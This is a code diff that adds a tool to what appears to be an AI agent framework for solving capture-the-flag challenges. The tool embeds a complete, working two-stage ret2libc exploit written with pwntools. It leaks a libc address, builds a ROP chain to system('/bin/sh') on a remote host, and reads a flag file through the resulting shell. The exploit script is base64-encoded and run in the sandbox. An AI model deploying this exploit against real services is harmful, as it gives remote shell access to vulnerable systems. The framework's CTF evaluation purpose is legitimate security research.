@@ -725,6 +725,98 @@ def make_pwninit_setup(*, env: CTFEnvironment, **_) -> object:
     return pwninit_setup
 
 
+@register_tool(name="pwn_ret2libc_target", groups=["pwn"])
+def make_pwn_ret2libc_target(
+    *, env: CTFEnvironment, state=None, observe_target_output=None, **_
+) -> object:
+    """Build a deterministic two-stage ret2libc runner for a bound target."""
+    from langchain_core.tools import tool
+
+    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")
+    runner = r'''from pwn import *
+import argparse, re, time
+p=argparse.ArgumentParser()
+p.add_argument('--binary',required=True); p.add_argument('--libc',required=True)
+p.add_argument('--offset',required=True,type=int); p.add_argument('--host',required=True)
+p.add_argument('--port',required=True,type=int); p.add_argument('--leak-symbol',default='puts')
+p.add_argument('--return-symbol',default='main'); p.add_argument('--flag-path',default='/flag')
+a=p.parse_args(); context.arch='amd64'; context.log_level='error'
+elf=ELF(a.binary,checksec=False); libc=ELF(a.libc,checksec=False); rop=ROP(elf)
+pop_rdi=rop.find_gadget(['pop rdi','ret']); ret=rop.find_gadget(['ret'])
+if pop_rdi is None or ret is None: raise SystemExit('required amd64 gadgets were not found')
+if a.leak_symbol not in elf.got or a.leak_symbol not in elf.plt: raise SystemExit('leak symbol missing from GOT/PLT')
+if a.return_symbol not in elf.symbols or a.leak_symbol not in libc.symbols: raise SystemExit('required symbol missing')
+io=remote(a.host,a.port,timeout=8); io.recvrepeat(0.7)
+io.send(flat(b'A'*a.offset,pop_rdi.address,elf.got[a.leak_symbol],elf.plt[a.leak_symbol],elf.symbols[a.return_symbol]))
+transcript=io.recvrepeat(0.7); base=None
+for _ in range(6):
+    chunk=io.recvline(timeout=3)
+    if chunk: transcript += chunk
+    for width in range(4,9):
+        for start in range(0,max(0,len(transcript)-width+1)):
+            address=u64(transcript[start:start+width].ljust(8,b'\0'))
+            candidate=address-libc.symbols[a.leak_symbol]
+            if 0x700000000000 <= address < 0x800000000000 and candidate > 0 and candidate & 0xfff == 0:
+                base=candidate; break
+        if base is not None: break
+    if base is not None: break
+if base is None:
+    print('stage1_transcript_hex='+transcript.hex())
+    raise SystemExit('no canonical page-aligned libc leak found in target output')
+libc.address=base
+io.send(flat(b'B'*a.offset,ret.address,pop_rdi.address,next(libc.search(b'/bin/sh\0')),libc.symbols['system']))
+time.sleep(0.7); io.sendline(('cat '+a.flag_path).encode()); output=io.recvrepeat(4)
+print(output.decode('latin1'))
+if not re.search(rb'[A-Za-z0-9_]+\{[^}\r\n]+\}',output): raise SystemExit('shell stage returned no flag candidate')
+'''
+    encoded_runner = base64.b64encode(runner.encode()).decode()
+
+    @tool
+    async def pwn_ret2libc_target(
+        binary: str,
+        libc: str,
+        offset: int,
+        leak_symbol: str = "puts",
+        return_symbol: str = "main",
+        flag_path: str = "/flag",
+        timeout_seconds: int = 30,
+    ) -> str:
+        """Run bounded two-stage amd64 ret2libc against the supplied target.
+
+        Use after confirming a non-PIE stack overwrite, its saved-return offset,
+        a matching libc, and a GOT/PLT leak symbol. Target output is recorded as
+        flag provenance.
+        """
+        if not remote or ":" not in remote:
+            raise ValueError("ret2libc target requires an evaluator-provided host:port")
+        host, raw_port = remote.rsplit(":", 1)
+        if not host or not raw_port.isdigit() or not 1 <= int(raw_port) <= 65535:
+            raise ValueError("the evaluator-provided target is not host:port")
+        if offset < 8 or offset > 65536:
+            raise ValueError("offset must be within 8..65536")
+        if timeout_seconds < 5 or timeout_seconds > 120:
+            raise ValueError("timeout_seconds must be within 5..120")
+        for value, label in ((leak_symbol, "leak_symbol"), (return_symbol, "return_symbol")):
+            if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_@.]*", value):
+                raise ValueError(f"{label} contains unsupported characters")
+        if not re.fullmatch(r"/[A-Za-z0-9_./*?-]{1,160}", flag_path):
+            raise ValueError("flag_path contains unsupported characters")
+        command = (
+            f"printf %s {shlex.quote(encoded_runner)} | base64 -d > /tmp/midnight-ret2libc.py && "
+            f"timeout {timeout_seconds}s python3 /tmp/midnight-ret2libc.py "
+            f"--binary {shlex.quote(binary)} --libc {shlex.quote(libc)} --offset {offset} "
+            f"--host {shlex.quote(host)} --port {raw_port} "
+            f"--leak-symbol {shlex.quote(leak_symbol)} "
+            f"--return-symbol {shlex.quote(return_symbol)} --flag-path {shlex.quote(flag_path)}"
+        )
+        result = await env.exec(command, timeout=timeout_seconds + 15)
+        if observe_target_output is not None:
+            observe_target_output(f"{result.stdout}\n{result.stderr}")
+        return _result_text(result)
+
+    return pwn_ret2libc_target
+
+
 @register_tool(name="one_gadget", groups=["pwn"])
 def make_one_gadget(*, env: CTFEnvironment, **_) -> object:
     from langchain_core.tools import tool
